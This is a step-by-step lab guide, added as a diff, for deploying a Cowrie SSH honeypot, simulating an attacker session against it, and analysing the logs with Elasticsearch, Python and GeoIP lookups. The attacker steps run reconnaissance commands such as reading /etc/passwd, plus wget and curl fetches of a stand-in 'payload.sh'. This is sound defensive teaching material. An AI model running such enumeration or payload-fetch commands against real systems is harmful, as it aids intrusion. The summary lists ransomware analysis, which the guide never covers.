@@ -1,1 +1,153 @@
+## Machine 1 (Kali Linux - Honeypot Server)
+### Step 1: Update System
+sudo apt update
+sudo apt upgrade -y
+
+### Step 2: Clone Cowrie
+git clone https://github.com/cowrie/cowrie.git
+cd cowrie
+
+### Step 3: Create Virtual Environment
+python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+
+### Step 4: Install Dependencies
+pip install -r requirements.txt --break-system-packages
+
+### Step 5: Configure Cowrie
+cp etc/cowrie.cfg.dist etc/cowrie.cfg
+nano etc/cowrie.cfg
+
+### Step 6: Start Cowrie
+cowrie start
+
+### Step 7: Verify Service
+cowrie status
+
+### Step 8: Verify Port
+
+ss -tulnp | grep 2222
+
+## Machine 2 (Ubuntu - Attacker Machine)
+### Step 9: Connect to Honeypot
+
+ssh root@ipaddress -p 2222
+
+### Step 10: Reconnaissance Commands
+uname -a
+whoami
+pwd
+
+### Step 11: Additional Enumeration
+id
+hostname
+ls
+ls -la
+env
+ps aux
+
+### Step 12: Directory Exploration
+
+cd /home
+ls
+cd /tmp
+ls
+cd /var
+ls
+cd /etc
+ls
+
+### Step 13: File Discovery
+
+find . -type f
+cat /etc/passwd
+
+### Step 14: Network Enumeration
+
+ifconfig
+ip addr
+netstat -an
+
+### Step 15: Simulated Download Attempts
+
+wget http://example.com/payload.sh
+curl http://example.com/file.sh
+
+### Step 16: Exit Session
+
+exit
+
+## Back to Machine 1 (Kali)
+### Step 17: View Logs
+cd ~/cowrie/var/log/cowrie
+ls
+
+### Step 18: View Cowrie Logs
+cat cowrie.log
+
+### Step 19: View JSON Logs
+cat cowrie.json
+
+### Step 20: Extract Commands
+grep "CMD:" cowrie.log
+
+## Elasticsearch Setup
+### Step 21: Install Dependencies
+sudo apt install apt-transport-https wget gnupg -y
+
+### Step 22: Add Elasticsearch Key
+wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
+
+### Step 23: Add Repository
+echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
+
+### Step 24: Update Packages
+sudo apt update
+
+### Step 25: Install Elasticsearch
+sudo apt install elasticsearch -y
+
+### Step 26: Start Service
+sudo systemctl start elasticsearch
+
+### Step 27: Enable Service
+sudo systemctl enable elasticsearch
+
+### Step 28: Verify Elasticsearch
+sudo systemctl status elasticsearch
+
+## Python Analysis
+### Step 29: Interaction Counter
+python3 interaction_counter.py
+
+### Step 30: Timeline Analysis
+python3 timeline_generator.py
+
+## Visualization
+### Step 31: Install Matplotlib
+pip install matplotlib --break-system-packages
+
+### Step 32: Generate Graph
+python3 entropy_plot.p
+
+## Geolocation Demonstration
+### Step 33: Obtain Public IP
+curl ipinfo.io/ip
+
+### Step 34: GeoIP Lookup
+curl ipinfo.io/<PUBLIC_IP>
+
+## Project Summary
+
+* Cowrie Honeypot Deployment
+* SSH Attack Simulation
+* Log Collection and Monitoring
+* Elasticsearch Integration
+* Python-Based Log Analysis
+* Timeline Analysis
+* Matplotlib Visualization
+* Geolocation Demonstration
+
+note: I have imported respositories from COWRIE REPOSITORY github
+* Ransomware Behavior Analysis
 
